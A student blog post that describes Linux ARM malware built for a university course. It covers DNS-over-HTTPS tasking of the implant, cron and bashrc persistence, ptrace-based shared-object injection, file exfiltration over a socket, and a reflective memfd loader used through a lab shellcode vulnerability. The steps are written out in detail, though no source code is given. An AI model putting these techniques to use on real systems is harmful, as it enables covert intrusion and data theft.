---
title: "A Technical Overview of our Linux Malware"
date: 2025-07-28T15:45:00Z
draft: false
---
# Disclaimer
This software is malware. As a result, I will not be open sourcing it, and only give snippets and general
overviews of the code.

# Introduction and Overview
For my final semester, I enrolled in a class called `Introduction to Capability Development`. In this class, we focus on
the Linux ARM platform, and both reverse engineer and write malware which targets this platform.

For the final project, our goal was to create a full-featured malicious software targeting the Linux ARM-based Raspberry Pi. This includes the *implant*, which is the 
implant that runs on the machine; the *C2 server*, which gives commands to and tracks existing implants; and the *client*, which allows an end user to send commands
to implants through the C2.

One other caveat exists regarding this project: the malware must be both general purpose and also specifically crafted to targets a *special environment*. This special environment
was revealed to us a few weeks before the end of the final project.
I'll talk more about the special environment in the next section. We needed to not only make the malware work in the
special environment, but also exploit a vulnerability in the environment to get onto the machine. 

Here is the general lifecycle for how the malware works.
![Malware Poster](../../static/malware_poster.png)

First, the implant is placed on a machine in some way. It is executed, and immediately calls out to our C2 over TLS. Our C2 grabs that request, inserts the implant's information
into its database, and returns a GUID to the implant. This will be its ID for communications going forward. On the back end, the C2 will create a DNS record for the implant, which
corresponds to the implant GUID. The DNS record will resolve to `1.1.1.0`.

Then, the implant will appear on the client webpage. The client can make a task and then assign it to the implant, which is then sent to the C2 and put 
into the database to be grabbed later. On the back end, the C2 will update the DNS record it created for the implant, and set it to `1.1.1.1`.

Periodically (and with a jitter), the implant will perform check-ins to the C2. For stealth and special functionality, we opted for a DNS-over-HTTPS workflow. Essentially,
the implant will make a DNS request over HTTPS to Cloudflare to its special DNS record that the C2 created for it, which will return either `1.1.1.0` or `1.1.1.1`. These are the 
only two options, and only differ in a single 1 or 0. If the domain resolves to the former, it knows that there is **no** task waiting for it. If the domain resolves to the latter,
it knows that there **is** a task waiting for it. In the case that there is no task waiting for it, it simply sleeps and waits to check in again.

However, if there is a task waiting for it, the implant will send a request to a special C2 endpoint, which gives it back a task request. The implant takes the request, performs the 
task, and returns a task response to the C2. The C2 will store the task response in the database and the client will render it on the implant's information page on the client website.
An example of a task would be something like `exec`: upon receiving the `exec` task, the implant will execute a shell command that was given in the task request, and send the output
of the command back to the C2.

# Special Environment, Exploit
The special environment, as stated earlier, was released a few weeks before the due date of the project. The goal of our malware was to attack this special environment and exfiltrate
certain data from it.

Our environment was an Android-esque backup service. Essentially, it acted as a service which continually received messages to back up, and stored them for safe retrieval.
The interesting part about the environment was not the service's use case, but rather the inner workings. Essentially, we were given an OVA of the virtual machine which runs the
software, and reverse engineered it to figure out how to attack it. I'll explain how the special environment worked from a high level.
The environment touted the security features of its software because of the way it separates privileges. Essentially, the service separates the networking and disk IO features
of its software, so that if you gain access to the process with access to the disk IO, you have no network access, and if you gain access to the process with access to the network,
you have no disk IO. 

The special environment starts with a `zygote` process. This process spawned a child, which I'll refer to as `proxy`. Then, `proxy` spawned a child of its own, which I'll call `app`.
After these two processes were spawned, `zygote` modified the permissions of each process; the `proxy` process was given permissions to the network but not disk IO, and the `app`
process was given rights to disk IO but had no network access. The two processes communicated via a Unix socket. One other caveat existed, 
which is that the `proxy` process had *ptrace* permissions on the `app` process.

There was also a significant vulnerability in this special environment. The HTTP server allowed for a 'patch' mechanism in which there could be runtime patches sent to the software
in the form of shellcode. So, with a certain password and message format, someone could execute arbitrary shellcode on the machine. While this is a nice exploit to have, it still
makes it somewhat difficult to get our implant running on the machine. The required mechanism of exploitation was to create a **reflective shared object**. That will be talked about
more in future sections, but the idea was to send the backup service a special shared object which loads *itself* and runs. This means that we can get around the issue of
not having an ELF loader, since running shellcode is very different to loading an ELF, and gives us much less to work with, since we can't rely on many of the things that ELF 
loading does for us, such as resolving symbols, dynamic linking, handling relocations, etc.


# Implant
The implant was developed with three different execution styles in mind: a simple ELF, for simple execution; a shared object, for loading into running processes; and a reflective 
shared object, for exploiting the special environment by using shellcode execution to load itself. The implant was built with both general purpose functionality, i.e. file IO, remote
command execution, file and process listing, etc., but also has special environment functionality, such as ptrace injection and specialized looting. These functions will get their
own sections.

The implant communicates solely over TLS; it never uses an insecure channel. It is written fully in C, so we decided to use [mbedTLS](https://github.com/Mbed-TLS/mbedtls) for TLS
communications. Our implant also relies on [protobuf](https://github.com/protocolbuffers/protobuf) as its message format, and uses a home-grown HTTP implementation for its HTTP
communications (which only consist of `GET` and `POST` messages). Below, I will overview many of the features that the implant has.

## Protobuf
Our protobuf schema exists to standardize the messages that are sent between the C2 and the implant. Protobuf is nice because it is very compact and does not give away the entire
key-value pair of our communications, but rather only the values. It is not an easily-readable message format like JSON, and since it's a binary format, it would take more time and
energy to reverse engineer. Below is an example of one of our protobuf messages, the `TaskRequest`.

```protobuf
message TaskRequest {
  string TaskGuid = 1;
  int32 Opcode = 2;
  string Args = 3;
}
```
## Event loop but more in depth

## File I/O
An important part of our implant functionality is to be able to read and write files on the victim's disk. I wrote some functionality to grab files off the disk, chunk them,
and send them off to the C2. The implant can also grab chunks from the C2 and write them to disk as it receives each roundtrip response. In more depth, here's how it goes:

### Grabbing files
1. Client sends task to implant to grab file `/tmp/foobar`.
2. Implant receives task
3. Implant opens the file and figures out how many chunks it needs to send
4. Implant loops, reading the necessary chunk from the file and then sending it to the C2 until there are no chunks left to send

### Receiving files
1. Client uploads file `barbaz` to C2
2. Client sends task to implant to send file `barbaz` to the implant
3. Implant receives task `file-in` when it checks in, and begins loop
4. In each iteration of the loop, the implant asks for a file chunk in a URL based on the task GUID, and writes the received chunk to disk
5. The implant stops after it has received all the chunks

Writing to disk over and over is not a very great way of going about things; I rewrote the functionality to use an `mmap`ed buffer to continually write to instead,
which would then be written to disk all at once, but never ended up using it!

## Command execution
A simple but important feature to have is arbitrary command execution. The implant has a simple (and easily detectable) command execution function which does a few simple steps:

1. Grabs the arguments for the command from the task request
2. Creates a pipe and spawns a child process
3. Child redirects stdout and stdin to the pipe, and uses `execve` to execute the command
4. Parent receives piped output 
5. Output is sent to the C2 in a `TaskResponse` protobuf message

While simple and detectable, this was an easy, just-works implementation of arbitrary CLI command execution.

## Host awareness: files, processes, etc.
We wanted our implant to be able to give us a good idea of the runtime context of the victim machine. For example, what processes were running (not by 
using `/bin/ps` but rather via walking the `proc` table), what files were in an arbitrary directory (using `dirent`/`opendir`/etc.), getting environment
variables, getting the machine id, etc. It was important for us to write these functions without manually calling CLI commands like `ls` or `ps` because it
is less obvious when the implant actually performs these commands.

## Persistence
For persistence, we opted for a simple cronjob persistence mechanism, due to the lack of permissions when running our implant. We wrote our implant to
`/tmp/rsyslog`, then a cronjob which runs every five minutes to call it. Further, we have a script in the bashrc which checks for the existence of the
cronjob. If it's not there, then it will write it back into the crontab. So, this is a two-layer persistence mechanism which will keep the implant 
running even if its process has been killed.

## HTTP functionality
In order to communicate with our C2 (which ran a Gunicorn server), we needed HTTP functionality. However, we didn't want to rely on a dynamically linked
`curl`, and we also didn't want to statically link it, so I wrote our own little HTTP implementation. Obviously, it had minimal features and was very simple, 
but it worked to make `GET` and `POST` requests.

An example POST request would look like this:

```http
POST /taskresponse HTTP/1.1
Host: un.ethicalhack.ing
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-protobuf
Content-Length: 16

[protobuf msg]
```
## mbedTLS
The implant needed a TLS library to secure communications with the C2. I decided to go with mbedTLS because of its ease of use, and because I would need to statically link this -- 
can't rely on the victim machine having this library -- it also was great due to its low footprint on disk. OpenSSL is notoriously
complicated and also is pretty large, so I wanted to take a path of least resistance. 

## String obfuscation
This was one of the less important portions of the project. Essentially, we wanted the implant to not be very `strings`-able, so all of the strings that we used, i.e. C2 cert or domain,
were encrypted at rest, and decrypted when used. Then, we encrypted it again so that it was only ever in plaintext when in use. I use the term *encrypted* lightly because it was modeled after the Windows malware that I created the year before. That means that this
"encryption" was really just which only used a simple XOR cipher plus an extra little reversing step. This was not a very high priority because it wasn't a core functionality of the project,
so that was all we ended up doing. 

## Ptrace process injection
Process injection was both a general-purpose functionality (in the case that we are of a high enough permission level to actually use it)
and special environment functionality (process injection was necessary to perform "specialized looting," which is the next section).
The "input" to our process injection task is first, the process name (i.e. "child_proc"), and second, the shared object to inject.

First, the process ID of the process name is found (via opening `/proc`, walking the table to find the process name, and returning the pid).
Then, the task gets a little more involved. Our goal is to attach to the victim process, allocate memory for the shared object, write 
the shared object into the victim process's memory, then finally execute `dlopen` on the shared object. After that, we detach from the victim process
and pretend nothing happened.

Let's put that in slightly-more-technical steps:

1. Call `ptrace` with the arguments of `PTRACE_ATTACH` and `target_pid` to attach to the victim process. 
2. Find where `dlopen` and `mmap` are located in the victim process. To do this:
  1. First, assume that the victim process and our process is using the same libc (obviously)
  2. Find our libc base via crawling `/proc/self/maps`
  3. Find the victim process's libc base via crawling `/proc/[target_pid]/maps`
  4. Take the offsets from the libc base from our process (via `dlsym`ing `mmap` and `dlopen`)
  5. Calculate the victim's `mmap` and `dlopen` locations with this simple equation: `VICTIM_FN = VICTIM_LIBC_BASE + LOCAL_FN_OFFSET`. In other words, the victim's `mmap` location should be the libc base of the victim plus our `dlsym`ed `mmap` address minus our libc base address.
3. Call `mmap` in the victim process to make enough space for the incoming shared object. To do this, we use a function we made called `remote_call`, which does the following:
  1. Use `ptrace` with `PTRACE_GETREGSET` to grab the current registers of the victim process. We want to execute one thing and then leave the process, so we want to remember the current registers so that we can put them back later.
  2. Use `ptrace` with `PTRACE_PEEKTEXT` to find the victim's current return address (in its Link Register, i.e. register X30). Save for later.
  3. Use `ptrace` with `PTRACE_POKETEXT` to overwrite the victim's current return address with a BRK instruction (`brk #0`).
  4. Use `ptrace` with `PTRACE_SETREGSET` to overwrite the current registers to our desired registers (i.e. arguments for our command, plus the program counter pointing to our function address).
  5. Use `ptrace` with `PTRACE_CONT` to allow the process to start again. Immediately use `waitpid` to wait for it to hit the breakpoint that we set earlier.
  6. If it has hit the breakpoint, that means it did our command and we can set it back to its original state. Use `ptrace` with `PTRACE_GETREGSET` to get the return value for our command (register X0).
  7. Use `ptrace` with `PTRACE_POKETEXT` to bring back the original return address that we originally overwrote.
  8. Use `ptrace` with `PTRACE_SETREGSET` to put the original registers back into place.
  9. In the case of `mmap`, we do all of these steps, ensuring that the function address we pass into `remote_call` is the target `mmap` address.
4. Use `ptrace` with `PTRACE_POKETEXT` to write the path of the shared object, byte by byte, into the victim process's buffer which we created with `mmap`.
5. Call `dlopen` in the victim process with our `remote_call` function we outlined earlier on the victim process's buffer.
6. Use `ptrace` with `PTRACE_DETACH` to leave the process and go along with our days.

It's nice to use `ptrace` to run shared objects in processes because you can make whatever shared object you want out of it. You can force the victim process
to exfiltrate data, or exit, or anything else, and all you have to do is give it the shared object to make it work.

In the case of specialized looting -- which we will discuss next -- we will see the power of using `ptrace` to load shared objects, as the use case is pretty complex but relies heavily on our `ptrace` general purpose functionality.
  
## Specialized looting

As we noted, our malware is running in a *special environment*. The goal of our malware was to exfiltrate certain messages from the filesystem. However,
the process that we end up in when exploiting a vulnerability in the environment (more on that in the next section) doesn't have filesystem access; it only has network access. Its child process, however, *does* have
filesystem access, but *does not* have network access. That means that we must `ptrace` into the child process, use its filesystem access to get all of the messages, and then transport them back to our
process and send them home to our C2 with our network access. I'm not sure how simple that sounds, but it was not very simple. However, since we already built out a wonderful `ptrace` process injection implementation, 
our life becomes a little bit easier.

We can accomplish this task in multiple ways. The way we decided to do it was pretty cool. We used sockets to send open file descriptors from the child to the our process, which then
allows us to read the file descriptors even without filesystem access. In a little more depth, here were our steps:
1. Open up a socket. The special environment already used a socket for its inner workings, so we essentially just made the exact same name for our socket but put a `.` in front of it. Stealthy, kind of?
2. Listen on the socket in the parent process.
3. Use our `ptrace` functionality to run a special shared object in the child process. It does the following:
  1. Open up a socket and connect to the parent's created socket path.
  2. Walk through our messages directory, and for each file in the directory (used `dirent` to walk it), `open` the file and save the file descriptor.
  3. Call our `send_fd` method, which:
    1. Does a bunch of weird socket initialization that I no longer understand (see: `iovec`, `msghdr`, `cmsghdr`)
    2. Copies our file descriptor to a message buffer and sends it over the socket
  4. After all of our file descriptors are sent, close the directory and the socket.
4. Back to the parent: having accepted the child's socket connection, receive the file descriptors over the socket by doing more weird `cmsg`, `iovec`, and `msghdr` struct stuff
5. For each file descriptor received, `read` it and copy its contents to a buffer
6. Send back the final buffer contents after cleaning up the socket.

In practice, this actually worked! Sending file descriptors over a socket was not something I imagined to be possible, but this solution proved to
be a great culmination of our efforts so far. We also did other stuff like filtering the messages, but that isn't super important for the purposes of this post.

Let's now move on to the actual hardest part of this project, which was the initial compromise.

## The exploit, and reflective shared object
I overviewed the high-level exploit in the "Special Environment, Exploit" section above. In short, it allows for arbitrary shellcode execution, and our plan of attack
was to create a reflective shared object, i.e. a shared object which loads itself. This was by far the most difficult part of the project. Let's talk about the constraints, and why this is difficult.

The root of the constraint is that all we have is shellcode execution. That means we are not allowed to have nice things: no dynamic linking, no relocations, nothing fancy. No libc, either; we have to get that ourselves.
Since we don't know where this code is going to be loaded, it must also be position-independent. Let's go over the four-step process to make this happen, starting from the bottom and working out way up.

First, we know the final step already! That is, our implant runs on the machine. However, we need to get that implant on the machine somehow. To do so, we created a
reflective memfd payload which uses a statically linked mbedtls and protobuf to pull down our implant from the C2 server with HTTPS. It then creates a memfd buffer,
writes our implant to that memfd buffer, and calls `dlopen` to open up our implant (it is available as a shared object, remember) and `dlsym` to grab the main symbol and calls it.
You then will pose the imminent question of, "but how do you run this memfd payload? You are only running shellcode right now." That leads us to our third step, which is the reflective memfd loader.
This piece of code will get called without having any libc access, but we want to be able to use libc so that we can run the payload and give it libc access so that it can grab our implant easily.
So, we do something a little interesting. First, we set the entry point to a function we will call `load_memfd`. We begin by crawling `/proc/self/maps` with raw syscalls (`openat`, `read`, `close`, etc.) and custom-built
quality-of-life functions (`memcmp`, `strcmp`, etc.). We look for the `libc` string with `r-xp` permissions to find the libc base. Then, we crawl the symbol table
with that libc base to find `dlopen` and `sprintf`. We use the syscall for `memfd_create` to create space for us to write the payload. Note -- we need to know how big the payload is! For that, 
I actually hardcode the payload size in this step; when we `make` the project, it automatically writes the size of the payload into this file. It saves a lot of hassle.
After creating the memfd payload, we do something a little unexpected. This "third step" is technically combined with our second step, the memfd payload; the two files are shipped together.
So, what we want to do is actually find *our own* (by that I mean the ELF for our third step memfd reflective loader) base address. To do so, we essentially take the address of a function in our 
file and page align it, then increment our address over and over until we find the ELF magic bytes.

Now that we have found our own base address, we can write *our entire file* into the memfd buffer using the size that we hardcoded. To call `dlopen` on that memfd buffer,
we use the `sprintf` that we found earlier and create a string for `/proc/self/fd/%d`, where `%d` is the file descriptor from our `memfd_create` call. Once we call `dlopen` on that buffer,
we are home free and the payload will run! We did all of that without any of the nice things that are given to us by ELF loaders.

However, there is one final step. The final step is a total of one assembly command: a branch command. This is so that when we run our arbitary shellcode, it calls the entrypoint of our memfd reflective loader.
To figure out the offset, we have a script which generates this final step by using `readelf` on our reflective loader to find the function offset, and then create the assembly file
to branch to that. After the branch, we have a (page - 1) worth of `nop` commands so that when we concatenate this final bootstrapper with our memfd reflective loader, the loader is page aligned.

And that's it. To sum, our steps go as such:

1. Branch to a page aligned ELF's entry point
2. With raw syscalls, find libc base, extract `dlopen` from that libc, find its own ELF base address, and use `memfd_create` to write itself into a memfd buffer; call `dlopen` on said buffer
3. Use a statically linked `mbedtls` and `protobuf` to securely communicate with the C2 and pull down the shared object and write it into a `memfd` buffer. Run `dlopen` and `dlsym` to call the main function of the implant.
4. Profit

# C2, Client
I'm combining our C2 and Client into one thing because our "C2" was really just the backend of our client. This was a python Flask app which exposed some API endpoints for the implant to use,
such as endpoints for pulling down tasks and sending task outputs. It also exposed endpoints for client functionality such as creating and listing tasks, as well as keeping track of the implants.
The database backend was PostgreSQL. The Client allowed for total management (even a kill switch) of the implant and viewing all of its data in a very pretty web app format
which masqueraded as an AI image rating website (so no one would ever care to explore further!).

The C2 needed to ensure that it could chunk and receive chunked data from the implant in case of large data exfiltration like our specialized looting. It dynamically created
and modified specialized DNS records for each implant (see Intro and Overview for how that worked), kept all logs of client activity, and did everything with genuine Let's Encrypt certs.

I'm not going to explain too much more about the inner workings of the C2, because in general it was just complementary to the implant. The implant needed to be able to upload
files, so the C2 was given functionality to store files; the implant needed to be able to receive files, so the Client was given functionality to allow file upload and storage so it could be sent to the implant; etc.
This was all done in Python, and wasn't a constrained environment or had any significantly special functionality, so it's not necessary to go in depth, other than the functionality of our DNS over HTTPS system.
For that, I used the Cloudflare API to automate creating and modifying DNS records. It was actually quite easy!

# Challenges and lessons learned
Surely the most annoying part of creating this malware was memory management. There were many cases in which I forgot to free stuff that I allocated;
however, there was a GCC flag called `-fsanitize=address` which was the equivalent of a 10 liter glass of water divining itself into existence next to a
dehydrated person lost in the desert. This flag told me exactly what memory was being leaked when I forgot to free it, and what function allocated it!
It was AMAZINGLY useful, and saved me an immense amount of time and pain.

Making the reflective shared object (see: all four steps) was the hardest thing I've ever done, but somehow, debugging it was even harder. I think due
to intense trauma and several back-to-back-to-back exceptionally late nights worth of working on that devilish creation, I don't even remember many of
the issues I encountered. But when there was an issue, it was always difficult to track, and it often had to do with things that were hard to debug and
figure out in the moment. I remember working for hours on some sort of libc base issue until I figured it out at around 4:45 AM. I do not miss that.

One other thing that was a total pain was statically linking `mbedtls` and `protobuf`. This is probably because I had never done any significant static
linking before, but I found there to be an extreme lack of resources online in how to statically link these two libraries to our loader payload. I
remember having a tougher time with `mbedtls` than protobuf; also, at one point, I successfully statically linked `mbedtls` but it was the wrong version.
Figuring out that it was the wrong version was a project in and of itself.

# Sunset
Thank you for reading! This was the hardest thing I've ever worked on, and definitely the most time-consuming, but incredibly rewarding. I hope you enjoyed!

